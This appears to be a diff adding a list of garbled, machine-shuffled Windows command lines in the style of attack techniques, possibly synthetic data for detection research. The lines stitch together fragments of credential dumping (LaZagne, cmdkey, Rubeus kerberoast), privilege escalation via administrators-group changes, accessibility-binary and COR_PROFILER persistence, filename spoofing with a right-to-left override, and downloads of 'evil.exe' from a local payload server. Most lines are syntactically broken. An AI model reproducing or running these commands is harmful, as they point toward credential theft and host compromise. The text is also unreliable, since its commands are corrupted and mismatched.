@@ -1,0 +1,64 @@
+net localgroup administrators `` explorer.exe , cor_profiler '' $ '' c cor_profiler '' c '' /v threadingmodel '' ''
+ffuf -w $ consumerargs
+net localgroup `` administrators '' /t cor_profiler ''
+net localgroup administrators `` autorun '' /f
+$ shortcut.targetpath= '' '' -w `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } @ autorun $ { binary } \ $ true
+hydra -l $ ( `` hkey_local_machine\system\currentcontrolset\services\ntds = `` http : software\classes\clsid\ '' volumn name http http : //192.168.1.29:9000/payload/evil.exe -r name = http http http http : //192.168.1.29:9000/payload/evil.exe -o ) http //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb ;
+net localgroup administrators `` cor_profiler '' /t reg_dword
+ren $ { flie_name } abc‮xcod.scr
+iediagcmd.exe clone $ { source_file } -l $ ( = `` administrators '' '' \inprocserver32 file in $ '' ;
+cmdkey /list
+reg add `` hkey_local_machine\system\currentcontrolset\services\ntds '' '' c `` cor_profiler '' '' /f
+winrar /domain `` 7 c : \microsoft\teams\current\teams.exe
+videocap.exe -t $ shortcut = `` cor_profiler = `` '' '' /f
+remove-item -path = $ { windir volumn name you `` http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+dig $ { user_name } -l $ ( '' ;
+sharprdp.exe $ env : user_name } /add
+net localgroup administrators '' /f
+put -filter `` $ domain /domain
+get-ciminstance -classname win32_processor | where-object $ i > = http : \software\microsoft\command | \microsoft\teams\current\teams.exe
+[ firewall set opmode archive_file_name
+net localgroup `` administrators '' '' cor_profiler ''
+iediagcmd.exe scriptingengine='vbscript , dns } -d ''
+nmap -o $ `` domain -name `` administrators '' '' /f
+net localgroup `` administrators '' /t reg_dword /d `` domain }
+hydra -l $ `` .\lazagne .. exe all
+dir -executionpolicy -verbose
+bitsadmin.exe /create $ 1
+conhost.exe [ -list | os ; ] 1000 all
+subfinder -d volumn -o { drive }
+sc dump
+namp -sn in `` $ target t1547.009 t1547.009 . ) c hkey_local_machine\software\microsoft\windows \inprocserver32 '' file execution file file execution '__filtertoconsumerbinding file ; /grant administrators administrators '' -name $ : cor_profiler ;
+net localgroup administrators `` cor_profiler '' /t set-service , threadingmodel '' /d $ \windows\system32\sethc.exe
+get-ciminstance -classname win32_operatingsystem | /format : -w $ i ) '' in in $ i ;
+remove-item -path $ { target volumn name you copy .id = components\atomic_test '' file '' -name windir '' ;
+wt.exe $ `` loadappinit_dlls '' '' /t reg_multi_sz
+lazagne.exe windows
+cmdkey.exe /list
+localappdata % \microsoft\teams\current\teams.exe
+icacls % \system32\osk.exe
+reg query
+[ -classname win32_desktop
+net localgroup `` administrators '' /v target '' /v cor_profiler '' ''
+`` 'https : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+nbtstat -n
+quser
+attrib +h $ domain admins = `` '' '' /v cor_profiler '' ''
+remove-item -path c : set-wmiinstance -o '' -name administrators '' ''
+net localgroup administrators `` '' t1547.009 nt\currentversion\windows '' /v cor_profiler ''
+curl http : \updater.exe -command hklm : $ : windir % localappdata % \system32\osk.exe /grant administrators administrators '' ''
+net localgroup administrators '' /f
+attrib +h $ target t1547.009 nt\currentversion\winlogon\notify\atomicredteam
+add-localgroupmember -sn = `` cor_profiler = threadingmodel '' ;
+get-ciminstance http -exec= $ { shadow copy volumn name you copy \users\
+net localgroup `` administrators '' /v /v user_name '' /f
+.\rubeus.exe kerberoast /create admins '' -l $ '' t1547.009 you new-object -comobject ; full
+net localgroup administrators `` '' '' file '' /v cor_profiler '' c : cor_profiler administrators ''
+assoc $ `` domain }
+get-clipboard
+namp -sn -l $ target t1547.009 . = cor_enable_profiling '' threadingmodel ''
+copy `` .\lazagne win32_processor foreach-object target | localappdata ) c http : hklm\security\policy\secrets % localappdata % \microsoft\teams\current\teams.exe
+dir -executionpolicy file c .\lazagne tmp.run 1
+7z `` domain ( bypass
+if ( new-object dir '' $ 'https : //192.168.1.29:9000/payload/evil.exe ' t1547.009 account userinit.exe = userinit.exe , keylog
+gpresult /z
